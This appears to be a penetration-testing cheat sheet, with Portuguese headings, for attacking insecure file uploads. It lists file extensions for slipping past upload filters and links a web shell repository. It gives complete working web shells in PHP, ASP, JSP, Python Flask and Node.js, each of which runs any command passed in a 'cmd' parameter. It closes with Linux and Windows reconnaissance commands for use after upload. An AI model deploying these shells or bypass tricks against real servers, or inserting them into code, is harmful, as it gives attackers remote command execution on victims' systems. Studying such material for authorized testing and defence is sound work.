## Extensões para bypass
```
PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtm, .phtml, .phar

ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml

JSP: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
```
## Web Shell Files 
github.com/tennc/webshell

## PHP Simple Web Shell
```
<?php
    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
?>
```
## ASP Simple Web Shell
```
<% 
If Request.QueryString("cmd") <> "" Then 
    Set objShell = Server.CreateObject("WScript.Shell") 
    Set objExec = objShell.Exec(Request.QueryString("cmd")) 
    Set objOutput = objExec.StdOut 
    Response.Write("<pre>" & objOutput.ReadAll() & "</pre>") 
End If 
%>
```
## JSP Simple Web Shell
```
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    String s = "";
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
    while ((s = sI.readLine()) != null) {
        out.println(s);
    }
}
%>
```
## Python Simple Web Shell
```
import os
from flask import Flask, request

app = Flask(__name__)

@app.route('/shell', methods=['GET'])
def shell():
    cmd = request.args.get('cmd')
    if cmd:
        output = os.popen(cmd).read()
        return f"<pre>{output}</pre>"
    return "<pre>No command provided</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```
## Node.js Simple Web Shell
```
const express = require('express');
const { exec } = require('child_process');

const app = express();

app.get('/shell', (req, res) => {
  const cmd = req.query.cmd;
  if (cmd) {
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        res.send(`<pre>${stderr}</pre>`);
        return;
      }
      res.send(`<pre>${stdout}</pre>`);
    });
  } else {
    res.send('<pre>No command provided</pre>');
  }
});

app.listen(8080, '0.0.0.0', () => {
  console.log('Web shell running on port 8080');
});
```


## Comandos Linux para Upload Inseguro
| Command  | Description                                                                 |
|----------|-----------------------------------------------------------------------------|
| whoami   | Displays the name of the current user account.                             |
| hostname | Shows the system's host name.                                               |
| ifconfig | Displays the configuration and status of network interfaces.               |
| ping     | Sends data to a specified IP address or hostname.                          |
| id       | Displays user or group ID information.                                      |
| uname    | Provides information about the operating system.                            |
| ls       | Lists directory contents.                                                   |
| pwd      | Displays the current working directory.                                     |
| cd       | Changes the working directory.                                              |
| cat      | Prints the contents of a file to the screen.                                |
| touch    | Creates an empty file or updates the timestamp of a file.                   |
| rm       | Removes files or directories.                                               |
| grep     | Searches for a specific pattern in a text file.                             |
| find     | Searches for files or directories within directory structures.              |
| wget     | Downloads files from a specified URL.                                       |
| curl     | Retrieves or sends data from/to URLs.                                        |
| echo     | Prints a text or variable content to the screen.                            |
| chmod    | Changes file permissions.                                                    |
| chown    | Changes file or directory ownership.                                        |
| sleep    | Waits for a specified period of time.                                       |

## Comandos Windows para Upload Inseguro
| Command     | Description                                                   |
|------------|---------------------------------------------------------------|
| whoami     | Displays the name of the current user account.                |
| hostname   | Shows the computer's host name.                               |
| ipconfig   | Provides network configuration and status information.        |
| ping       | Sends data to a specified IP address or hostname.             |
| net user   | Displays or manages user accounts.                            |
| systeminfo | Lists general system information about the computer.          |
| dir        | Lists directory contents.                                     |
| cd         | Changes the working directory.                                |
| type       | Displays the contents of a file.                              |
| echo       | Prints a text or variable content to the screen.              |
| copy       | Copies files or directories.                                  |
| del        | Deletes files.                                                |
| findstr    | Searches for a specific pattern in a text file.               |
| powershell | Executes a command in Windows PowerShell.                     |
| timeout    | Waits for a specified period of time.                         |

